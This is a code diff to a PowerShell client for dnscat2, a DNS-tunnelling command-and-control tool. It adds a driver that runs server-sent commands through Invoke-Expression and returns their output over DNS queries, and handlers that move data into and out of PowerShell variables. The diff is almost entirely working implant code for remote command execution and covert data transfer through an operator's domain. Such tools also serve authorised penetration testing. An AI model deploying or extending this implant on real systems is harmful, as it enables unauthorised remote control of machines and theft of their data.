@@ -389,6 +389,15 @@ function Start-Dnscat2Session ($SessionId, $Options, $Domain, $DNSServer, $DNSPo
     $Session["LookupTypes"] = $LookupTypes
     $Session["SYNOptions"] = $Options
     
+    $Session["PSCommandReady"] = $False
+    $Session["PSCommand"] = ""
+    $Session["PSUploadReady"] = $False
+    $Session["PSUploadName"] = ""
+    $Session["PSUploadValue"] = $null
+    $Session["PSDownloadReady"] = $False
+    $Session["PSDownloadPacketIdBF"] = ""
+    $Session["PSDownloadName"] = ""
+    
     $Session["Encryption"] = $Encryption
     $Session["Negotiated"] = $False
     $Session["EncryptionKeys"] = New-Object System.Collections.Hashtable
@@ -610,9 +619,16 @@ function Update-Dnscat2CommandSession ($Session) {
             "0002" # COMMAND_EXEC
             {
                 try {
-                    $NewSessionName = $Session.CommandFields.split("00")[0]
-                    $NewSessionCommand = Convert-HexToString $Session.CommandFields.split("00")[2]
-                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay "exec" $NewSessionCommand
+                    $NewSessionName = $Session.CommandFields.Substring(0,$Session.CommandFields.IndexOf("00"))
+                    $NewSessionCommand = Convert-HexToString ($Session.CommandFields.Substring($Session.CommandFields.IndexOf("00") + 2).replace("00",""))
+                    $NewSessionDriver = "exec"
+                    
+                    if ($NewSessionCommand -eq "psh") {
+                        $NewSessionDriver = "PS"
+                        $NewSessionCommand = ""
+                    }
+                    
+                    $NewSession = Start-Dnscat2Session (New-RandomDNSField 4) ("0001" + $NewSessionName + '00') $Session.Domain $Session.DNSServer $Session.DNSPort $Session.MaxPacketSize $Session.Encryption $Session["EncryptionKeys"].PreSharedSecret $Session.LookupTypes $Session.Delay $NewSessionDriver $NewSessionCommand
                     $Session.NewSessions.Add($NewSession.SessionId, $NewSession)
                     $PacketLengthField = ([Convert]::ToString((4 + $NewSession.SessionId.Length/2),16)).PadLeft(8, '0')
                     $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0002" + $NewSession.SessionId)
@@ -630,10 +646,17 @@ function Update-Dnscat2CommandSession ($Session) {
             {
                 try {
                     $FileName = Convert-HexToString $Session.CommandFields.TrimEnd('00')
-                    $FileHexDump = Convert-BytesToHex ([IO.File]::ReadAllBytes($FileName))
-                    $PacketLengthField = ([Convert]::ToString((4 + ($FileHexDump.Length/2)),16)).PadLeft(8, '0')
-                    $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)
-                    $Session["DriverDataQueue"] += $DriverData
+                    
+                    if ($FileName.StartsWith("bytes:$")) {
+                        $Session["PSDownloadReady"] = $True
+                        $Session["PSDownloadName"] = $FileName.Substring(7)
+                        $Session["PSDownloadPacketIdBF"] = $Session.PacketIdBF
+                    } else {
+                        $FileHexDump = Convert-BytesToHex ([IO.File]::ReadAllBytes($FileName))
+                        $PacketLengthField = ([Convert]::ToString((4 + ($FileHexDump.Length/2)),16)).PadLeft(8, '0')
+                        $DriverData = ($PacketLengthField + $Session.PacketIdBF + "0003" + $FileHexDump)                    
+                        $Session["DriverDataQueue"] += $DriverData
+                    }
                 } catch {
                     $ErrorCode = $CommandId
                     $Reason = (Convert-StringToHex "Could not read file. Make sure to provide the full path!") + "00"
@@ -649,7 +672,14 @@ function Update-Dnscat2CommandSession ($Session) {
                     $FileName = Convert-HexToString ($Data[0..($Data.IndexOf('00') - 1)] -join '')
                     [String]$Data = (($Data[($Data.IndexOf('00') + 2)..$Data.Length]) -join '')
                     [byte[]]$Bytes = Convert-HexToBytes $Data
-                    [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
+                    
+                    if ($FileName.StartsWith("bytes:$")) {
+                        $Session["PSUploadReady"] = $True
+                        $Session["PSUploadName"] = $FileName.Substring(7)
+                        $Session["PSUploadValue"] = $Bytes
+                    } else {
+                        [IO.File]::WriteAllBytes($FileName, $Bytes) 2>&1 | Out-Null
+                    }
                 } catch {
                     $ErrorCode = $CommandId
                     $Reason = (Convert-StringToHex "Could not write file") + "00"
@@ -776,6 +806,12 @@ function Send-DataToDriver ($Data, $Session) {
     } elseif ($Session["Driver"] -eq "exec") {
         $StringData = Convert-HexToString $Data
         ($Session["Process"]).StandardInput.WriteLine($StringData.TrimEnd("`r").TrimEnd("`n"))
+    } elseif ($Session["Driver"] -eq "PS") {
+        # Only execute when a newline is sent
+        $Session["PSCommand"] += $Data
+        if (($Session["PSCommand"][-1..-2] -join '') -eq 'A0') {
+            $Session["PSCommandReady"] = $True
+        }
     }
     return $Session
 }
@@ -884,6 +920,10 @@ function Start-Dnscat2 {
     
     .PARAMETER Console
         Link the I/O of the console with the Dnscat2 session.
+
+    .PARAMETER ExecPS
+        Simulate a Powershell session and link the IO with the Dnscat2 session.
+        WARNING: Exiting will kill the entire dnscat2 client, not just the session.
     
     .PARAMETER PreSharedSecret
         Set the shared secret. Set the same one on the server and the client to prevent man-in-the-middle attacks!
@@ -913,12 +953,13 @@ function Start-Dnscat2 {
 		[switch]$Command=$True,
         [Alias("e")][string]$Exec="",
         [switch]$Console=$False,
+        [Alias("psh")][switch]$ExecPS=$False,
         [Alias("sec")][string]$PreSharedSecret="",
-        [Alias("n")][switch]$NoEncryption=$false,
+        [Alias("ne")][switch]$NoEncryption=$false,
         [string[]]$LookupTypes=@("TXT","MX","CNAME"),
-        [int32]$Delay=0,
+        [Alias("t")][int32]$Delay=0,
         [ValidateRange(1,240)][int32]$MaxPacketSize=240,
-        [string]$Name=""
+        [Alias("n")][string]$Name=""
     )
     
     foreach ($LookupType in $LookupTypes) {
@@ -936,6 +977,9 @@ function Start-Dnscat2 {
         $DriverOptions = $Exec
     } elseif ($Console) {
         $Driver = 'console'
+		$DriverOptions = ''
+    } elseif ($ExecPS) {
+        $Driver = 'PS'
 		$DriverOptions = ''
     } else {
 		$Driver = 'command'
@@ -975,6 +1019,36 @@ function Start-Dnscat2 {
             $SessionIds += $Sessions.Keys
             foreach ($SessionId in $SessionIds) {
                 $Sessions[$SessionId] = Update-Dnscat2Session $Sessions[$SessionId]
+                
+                # Execute PS commands here for access to full scope
+                if ($Sessions[$SessionId]["PSCommandReady"]) {
+                    try { $Sessions[$SessionId]["DriverDataQueue"] += (Convert-StringToHex (Invoke-Expression (Convert-HexToString $Sessions[$SessionId]["PSCommand"]) | Out-String)) } catch { }
+                    $Sessions[$SessionId]["PSCommand"] = ""
+                    $Sessions[$SessionId]["PSCommandReady"] = $False
+                }
+                
+                # Execute PS uploads here for access to full scope
+                if ($Sessions[$SessionId]["PSUploadReady"]) {
+                    try { Set-Variable -Name $Sessions[$SessionId]["PSUploadName"] -Value $Sessions[$SessionId]["PSUploadValue"] } catch { }
+                    $Sessions[$SessionId]["PSUploadReady"] = $False
+                    $Sessions[$SessionId]["PSUploadName"] = ""
+                    $Sessions[$SessionId]["PSUploadValue"] = $null
+                }
+                
+                # Execute PS downloads here for access to full scope
+                if ($Sessions[$SessionId]["PSDownloadReady"]) {
+                    try {
+                        $VarValue = (Get-Variable -Name $Sessions[$SessionId]["PSDownloadName"] -ValueOnly)
+                        if ($VarValue.GetType().fullname -eq "System.Byte[]") {
+                            $VarValue = Convert-BytesToHex $VarValue
+                            $PacketLengthField = ([Convert]::ToString((4 + ($VarValue.Length/2)),16)).PadLeft(8, '0')
+                            $Sessions[$SessionId]["DriverDataQueue"] += ($PacketLengthField + $Sessions[$SessionId]["PSDownloadPacketIdBF"] + "0003" + $VarValue)
+                        }
+                    } catch { }
+                    $Sessions[$SessionId]["PSDownloadReady"] = $False
+                    $Sessions[$SessionId]["PSDownloadPacketIdBF"] = ""
+                    $Sessions[$SessionId]["PSDownloadName"] = ""
+                }
                 
                 if ($Sessions[$SessionId].Dead) {
                     $DeadSessions += $SessionId
